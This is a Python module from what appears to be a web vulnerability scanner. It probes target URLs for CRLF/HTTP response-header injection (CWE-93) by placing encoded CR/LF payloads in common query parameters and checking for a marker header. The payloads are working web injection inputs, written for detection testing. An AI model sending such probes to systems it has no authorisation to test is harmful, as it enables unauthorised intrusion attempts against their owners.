"""CRLF / HTTP response-header injection probe (CWE-93).

Injects encoded carriage-return/line-feed sequences into common request
parameters. If the server fails to sanitise the value before echoing it into
a response header (a classic header-splitting / response-splitting flaw), the
injected line breaks out of the original header and emits an
*attacker-controlled* response header.

We seed every payload with a unique per-run random token and confirm the flaw
ONLY when the injected header ``x-crlf-test`` appears in ``resp.headers`` with
that exact token. Reflection of the token in the response *body* is explicitly
NOT treated as a finding — that would be XSS/reflection, not header injection,
and using a fresh random token per run makes the two impossible to confuse.

Payload encodings tested per parameter:
  - ``%0d%0a`` (CRLF, percent-encoded)
  - raw ``\\r\\n`` (some frameworks decode/normalise raw bytes)
  - ``%0a`` only (LF-only — many servers split on a bare LF)
"""

from __future__ import annotations

import logging
import secrets
from typing import List

from core.swarm_engine import SwarmAgent
from core.swarm_workers import register_worker

from ._http import add_query, fetch, normalize_target_url

logger = logging.getLogger("viper.swarm_workers.vuln.crlf")

TECHNIQUE = "crlf"

# Header the injected payload tries to smuggle into the response.
_INJECTED_HEADER = "x-crlf-test"

# Common parameters that frequently flow into redirect/Location/Set-Cookie
# style headers — the usual sinks for response-splitting.
_PARAMS = ("q", "url", "redirect", "next", "return", "lang",
           "page", "search", "callback", "id")


def _payloads(token: str) -> list[tuple[str, str]]:
    """(label, value) payloads that each try to inject `x-crlf-test: <token>`.

    The value carries `<token>` so a true positive is unambiguous: that exact
    random string can only appear in a response header if the server split it
    out of our parameter value.
    """
    marker = f"viper{token}"
    return [
        # CRLF, fully percent-encoded (header name + value also encoded).
        ("crlf_enc", f"%0d%0a{_INJECTED_HEADER}%3a {marker}"),
        # Raw CR/LF bytes — some stacks decode/normalise these directly.
        ("crlf_raw", f"\r\n{_INJECTED_HEADER}: {marker}"),
        # LF-only, percent-encoded — bare LF is a common splitting weakness.
        ("lf_only", f"%0a{_INJECTED_HEADER}%3a{marker}"),
    ]


async def run(agent: SwarmAgent) -> List[dict]:
    url = normalize_target_url(agent.target)
    if not url:
        return []
    timeout = min(agent.timeout_s, 10.0)
    findings: list[dict] = []

    # Unique per-run token. A header carrying THIS value proves injection,
    # since the server could only have produced it from our payload.
    token = secrets.token_hex(8)
    marker = f"viper{token}"

    seen: set[str] = set()  # (param) dedupe — one finding per vulnerable param

    for param in _PARAMS:
        if param in seen:
            continue
        for label, value in _payloads(token):
            target_url = add_query(url, param, value)
            # Do NOT follow redirects: a Location built from our payload is a
            # prime sink, and following it would mask the injected header.
            resp = await fetch("GET", target_url, timeout=timeout,
                               follow_redirects=False)
            if not resp:
                continue

            injected = resp.headers.get(_INJECTED_HEADER)
            # Confirm: header present AND carries our unique token. Header keys
            # are lowercased by the HTTP layer, so compare on the value only.
            if injected is not None and marker in injected:
                findings.append({
                    "type": "crlf_injection",
                    "vuln_type": "crlf_header_injection",
                    "title": (
                        "CRLF / HTTP response-header injection via "
                        f"'{param}' parameter ({label})"
                    ),
                    "severity": "high",
                    "url": target_url,
                    "cwe": "CWE-93",
                    "confidence": 0.95,
                    "evidence": (
                        f"Injected '{_INJECTED_HEADER}: {injected}' appeared as "
                        f"a response header (param={param}, encoding={label})"
                    ),
                    "payload": value,
                    "parameter": param,
                })
                seen.add(param)
                break  # one confirmed finding per param is enough

    return findings


register_worker("vuln", TECHNIQUE, run)
